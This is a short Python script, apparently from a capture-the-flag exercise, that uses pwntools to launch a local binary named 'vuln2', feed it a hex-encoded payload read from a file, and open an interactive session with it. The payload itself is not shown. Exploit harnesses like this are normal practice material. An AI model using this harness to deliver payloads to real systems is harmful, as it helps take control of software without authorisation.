from pwn import * 
elf = process('challenges/vuln2')
with open('exp', 'r') as exp:
    inp = bytes.fromhex(exp.readline())
print(inp)
elf.sendline(inp)
elf.interactive()